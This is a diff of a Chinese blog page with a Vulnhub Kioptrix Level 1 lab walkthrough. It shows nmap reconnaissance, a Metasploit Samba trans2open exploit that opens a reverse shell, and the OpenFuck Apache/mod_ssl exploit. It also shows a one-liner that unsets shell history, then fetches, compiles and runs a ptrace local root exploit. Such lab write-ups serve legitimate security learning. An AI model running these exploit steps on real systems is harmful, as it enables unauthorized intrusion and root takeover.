@@ -72,7 +72,7 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6nzx76h6j30oy0j0agg.jpg">
 <meta property="article:published_time" content="2020-02-23T11:49:32.000Z">
 <meta property="article:modified_time" content="2021-08-06T03:57:40.773Z">
-<meta property="article:author" content="Dana Shaw">
+<meta property="article:author" content="肖坤稼">
 <meta property="article:tag" content="vulnhub靶机练习">
 <meta property="article:tag" content="Kioptix Level 1">
 <meta name="twitter:card" content="summary">
@@ -149,7 +149,8 @@
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-        <p class="site-subtitle">为了去往别处</p>
+        <h1 class="site-subtitle" itemprop="description">为了去往别处</h1>
+      
   </div>
 
   <div class="site-nav-toggle">
@@ -224,9 +225,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -266,7 +265,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/./images/photo.jpg">
-      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="name" content="肖坤稼">
       <meta itemprop="description" content="连尘埃也想收藏">
     </span>
 
@@ -274,9 +273,9 @@
       <meta itemprop="name" content="Dana Shaw's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <h2 class="post-title" itemprop="name headline">
           vulnhub靶机练习之Kioptix Level 1
-        </h1>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -338,7 +337,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="探测靶机IP"><a href="#探测靶机IP" class="headerlink" title="探测靶机IP"></a>探测靶机IP</h2><p>用<code>sudo arp-scan</code>和<code>netdiscover -i eth0</code>都探测不到靶机IP。<a target="_blank" rel="noopener" href="https://blog.csdn.net/Viv233/article/details/104103628">参考</a>解决方法：将虚拟机文件<code>Kioptix Level 1.vmx</code>的<code>ethernet0.networkName = &quot;Bridged&quot;</code>改成<code>ethernet0.networkName = &quot;Nat&quot;</code>。</p>
+        <h2 id="探测靶机IP"><a href="#探测靶机IP" class="headerlink" title="探测靶机IP"></a>探测靶机IP</h2><p>用<code>sudo arp-scan</code>和<code>netdiscover -i eth0</code>都探测不到靶机IP。<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/Viv233/article/details/104103628">参考</a>解决方法：将虚拟机文件<code>Kioptix Level 1.vmx</code>的<code>ethernet0.networkName = &quot;Bridged&quot;</code>改成<code>ethernet0.networkName = &quot;Nat&quot;</code>。</p>
 <p><escape> <span id="more"></span></escape></p>
 <p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6lemqzsgj313d0lltab.jpg" alt="image.png"><br>靶机IP探测为192.1680.80.15，<code>netdiscover -i eth0</code>的扫描结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6ln4n92aj30ow06l40u.jpg" alt="image.png"></p>
 <h2 id="进一步扫描"><a href="#进一步扫描" class="headerlink" title="进一步扫描"></a>进一步扫描</h2><p>我们使用nmap扫描出靶机开放的端口信息如下：</p>
@@ -360,7 +359,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(linux/samba/trans2open) &gt; set payload generic/shell_reverse_tcp #设置载荷</span><br><span class="line">payload =&gt; generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(linux/samba/trans2open) &gt; run #执行漏洞利用</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.14:4444 </span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffdfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffcfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffbfc...</span><br><span class="line">[*] 192.168.80.15:139 - Trying return address 0xbffffafc...</span><br><span class="line">[*] Command shell session 5 opened (192.168.80.14:4444 -&gt; 192.168.80.15:1029) at 2020-02-23 07:41:48 -0500</span><br></pre></td></tr></table></figure>
 <p>于是我们获取到了靶机的shell。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6md9bdj4j30p00itjx6.jpg" alt="image.png"><br>输入mail，选择1，查询到制作者的flag信息。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mail</span><br><span class="line">Mail version 8.1 6/6/93.  Type ? for help.</span><br><span class="line">&quot;/var/mail/root&quot;: 2 messages 1 new 2 unread</span><br><span class="line"> U  1 root@kioptix.level1   Sat Sep 26 11:42  15/481   &quot;About Level 2&quot;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">N  2 root@kioptrix.level1  Sun Feb 23 07:55  18/524   <span class="string">&quot;LogWatch for kioptrix&quot;</span></span></span><br><span class="line">1</span><br><span class="line">Message 1:</span><br><span class="line">From root  Sat Sep 26 11:42:10 2009</span><br><span class="line">Date: Sat, 26 Sep 2009 11:42:10 -0400</span><br><span class="line">From: root &lt;root@kioptix.level1&gt;</span><br><span class="line">To: root@kioptix.level1</span><br><span class="line">Subject: About Level 2</span><br><span class="line"></span><br><span class="line">If you are reading this, you got root. Congratulations.</span><br><span class="line">Level 2 won&#x27;t be as easy...</span><br></pre></td></tr></table></figure>
-<h3 id="利用apache漏洞"><a href="#利用apache漏洞" class="headerlink" title="利用apache漏洞"></a>利用apache漏洞</h3><p>使用nmap做详细的端口扫描，发现靶机使用的apache版本是<code>Apache/1.3.20</code>。从<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/764">网上</a>查询，发现这个版本可进行漏洞利用。</p>
+<h3 id="利用apache漏洞"><a href="#利用apache漏洞" class="headerlink" title="利用apache漏洞"></a>利用apache漏洞</h3><p>使用nmap做详细的端口扫描，发现靶机使用的apache版本是<code>Apache/1.3.20</code>。从<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.exploit-db.com/exploits/764">网上</a>查询，发现这个版本可进行漏洞利用。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -A -n 192.168.80.15</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 07:57 EST</span><br><span class="line">Nmap scan report for 192.168.80.15</span><br><span class="line">Host is up (0.00093s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">|_ssl-date: 2020-02-23T14:00:24+00:00; +1h01m50s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:51:2D:92 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1h01m49s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.93 ms 192.168.80.15</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 128.38 seconds</span><br></pre></td></tr></table></figure>
 <p>于是，我们将漏洞利用脚本下载下来：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc6n18k5cdj31f60u0466.jpg" alt="image.png"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/764</span><br><span class="line">--2020-02-23 08:07:28--  https://www.exploit-db.com/download/764</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: ‘764’</span><br><span class="line"></span><br><span class="line">764                            [  &lt;=&gt;                                  ]  32.94K  78.1KB/s    in 0.4s    </span><br><span class="line"></span><br><span class="line">2020-02-23 08:07:33 (78.1 KB/s) - ‘764’ saved [33731]</span><br></pre></td></tr></table></figure>
@@ -368,9 +367,9 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:/tmp$ sudo gcc -o exploit 764.c -lcrypto</span><br><span class="line">764.c:21:10: fatal error: openssl/ssl.h: No such file or directory</span><br><span class="line">   21 | #include &lt;openssl/ssl.h&gt;</span><br><span class="line">      |          ^~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>
 <p>安装openssl失败：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:/tmp$ sudo apt-get install libssl-dev</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree       </span><br><span class="line">Reading state information... Done</span><br><span class="line">E: Unable to locate package libssl-dev</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://ourcodeworld.com/articles/read/961/how-to-solve-kali-linux-apt-get-install-e-unable-to-locate-package-checkinstall">参考</a>解决openssl的安装问题。<br><del>待续……参考walkthrough：</del><br><a target="_blank" rel="noopener" href="https://www.yeahhub.com/ctf-kioptrix-level-1-walkthrough/">metasploit利用漏洞详细步骤</a><br><a target="_blank" rel="noopener" href="http://blog.thinsad.com/index.php/archives/34.html">apache漏洞利用详细步骤</a><br>安装openssl相关组件：<code>apt-get install libssl1.0-dev</code><br>运行exp，进入靶机shell：</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ourcodeworld.com/articles/read/961/how-to-solve-kali-linux-apt-get-install-e-unable-to-locate-package-checkinstall">参考</a>解决openssl的安装问题。<br><del>待续……参考walkthrough：</del><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.yeahhub.com/ctf-kioptrix-level-1-walkthrough/">metasploit利用漏洞详细步骤</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://blog.thinsad.com/index.php/archives/34.html">apache漏洞利用详细步骤</a><br>安装openssl相关组件：<code>apt-get install libssl1.0-dev</code><br>运行exp，进入靶机shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:/tmp$ sudo gcc -o exploit 764.c -lcrypto</span><br><span class="line">kali@kali:/tmp$ ./exploit 0x6b 192.168.80.15 443 -c 40</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f8068</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line"> -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; p://192.168.80.14/ptrace-kmod.c; gcc </span><br><span class="line">--11:53:36--  http://192.168.80.14/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&#x27;</span><br><span class="line">Connecting to 192.168.80.14:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 404 Not Found</span><br><span class="line">11:53:36 ERROR 404: Not Found.</span><br><span class="line"></span><br><span class="line">gcc: ptrace-kmod.c: No such file or directory</span><br><span class="line">gcc: No input files</span><br><span class="line">rm: cannot remove `ptrace-kmod.c&#x27;: No such file or directory</span><br><span class="line">bash: ./p: No such file or directory</span><br><span class="line">bash-2.05$ </span><br><span class="line">bash-2.05$ whoami</span><br><span class="line">whoami</span><br><span class="line">apache</span><br></pre></td></tr></table></figure>
-<p>成功获得shell、为什么不是root权限，原因出在ptrace-kmod.c文件中。<br><del>待续……</del><br><a target="_blank" rel="noopener" href="https://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub">参考</a>进入shell之后，输入命令：<br><code>unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;</code></p>
+<p>成功获得shell、为什么不是root权限，原因出在ptrace-kmod.c文件中。<br><del>待续……</del><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.abatchy.com/2016/11/kioptrix-1-walkthrough-vulnhub">参考</a>进入shell之后，输入命令：<br><code>unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;</code></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br><span class="line">exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br><span class="line">--12:05:40--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&#x27;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 301 Moved Permanently</span><br><span class="line">Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]</span><br><span class="line">--12:05:47--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&#x27;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line">    0K ...                                                   100% @ 678.26 B/s</span><br><span class="line">12:34:16 (678.26 B/s) - `ptrace-kmod.c&#x27; saved [3921/3921]</span><br><span class="line">[+] Attached to 1615</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now wait for suid shell...</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机提权，有两种方法入手：一是利用samba溢出漏洞，用metasploit的msfconsole获取靶机shell，二是利用apache漏洞，用metasploit的msfconsole获取靶机shell。<br>从这个靶机学习的关键知识是，如何使用metasploit工具进行漏洞利用，获取靶机的反弹shell。</p>
@@ -385,21 +384,21 @@
 <div>
 <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>本文作者： </strong>Dana Shaw
+    <strong>本文作者： </strong>肖坤稼
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     <a href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_One.html" title="vulnhub靶机练习之Kioptix Level 1">https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_One.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
   </li>
 
   <div class="wechat_OA">
 	<span>欢迎关注我的公众号(Welcome to follow me on Wechat)</span>
 	<br>
     <!-- 这里添加你的二维码图片 -->
-	<img src ="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
+	<img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
 </div>
 
 </ul>
@@ -500,18 +499,17 @@
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A2%E6%B5%8B%E9%9D%B6%E6%9C%BAIP"><span class="nav-number">1.</span> <span class="nav-text">探测靶机IP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">进一步扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8nbtscan%E6%89%AB%E6%8F%8F139%E7%AB%AF%E5%8F%A3%E7%9A%84netbios-ssn%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.1.</span> <span class="nav-text">使用nbtscan扫描139端口的netbios-ssn服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msfconsole%E5%B7%A5%E5%85%B7%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="nav-number">2.2.</span> <span class="nav-text">使用msfconsole工具获取信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8samba%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.3.</span> <span class="nav-text">利用samba漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8apache%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.</span> <span class="nav-text">利用apache漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
-        <div id="">
+        <div id>
 	  <canvas id="canvas" style="width:60%;">
-	    </div>
+	    </canvas></div>
 	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
       <!--/noindex-->
 
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
-      src="/./images/photo.jpg">
-  <p class="site-author-name" itemprop="name">Dana Shaw</p>
+    <img class="site-author-image" itemprop="image" alt="肖坤稼" src="/./images/photo.jpg">
+  <p class="site-author-name" itemprop="name">肖坤稼</p>
   <div class="site-description" itemprop="description">连尘埃也想收藏</div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -519,7 +517,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">256</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -539,13 +537,13 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
@@ -560,7 +558,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="external nofollow noopener noreferrer" target="_blank">windows提权学习</a>
         </li>
     </ul>
   </div>
@@ -607,7 +605,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
+  <span class="author" itemprop="copyrightHolder">肖坤稼</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
@@ -621,7 +619,7 @@
 </div>
 
 
-  <script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+  <script src="https://unpkg.com/mermaid@/dist/mermaid.min.js"></script>
   <script>
     if (window.mermaid) {
       mermaid.initialize({theme: 'default'});
@@ -663,7 +661,7 @@
 
   
   
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
@@ -686,6 +684,15 @@
 
 
   
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
 
 
 
@@ -742,15 +749,9 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
 });
 </script>
 
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222"
-     crossorigin="anonymous"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222" crossorigin="anonymous"></script>
 <!-- sidebar -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-3938956891324222"
-     data-ad-slot="6163650450"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
